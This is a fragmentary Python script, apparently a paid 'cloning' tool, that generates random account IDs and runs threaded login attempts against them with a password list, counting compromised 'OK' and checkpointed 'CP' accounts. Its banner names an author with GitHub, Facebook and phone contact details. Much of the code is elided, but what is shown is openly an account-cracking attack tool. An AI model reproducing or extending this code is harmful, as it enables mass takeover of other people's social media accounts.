# SOURCE BY : Aarav
# GitHub : https://github.com/Aarav32
# Facebook : https://www.facebook.com/BAB
from os import path
...
\033[1;37m [•] \033[1;37mOwner     :   Aarav
 ...
 [•] Github    :   Aarav32
 [•] Tool      :   PAID
 [•] What's up :  9821438707 
 [•] Version   :  \033[1;32m 1.0\033[1;32m \033[1;37m
\033[1;37m______________________________________""")
def linex():
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as BAB:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    BAB.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    BAB.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
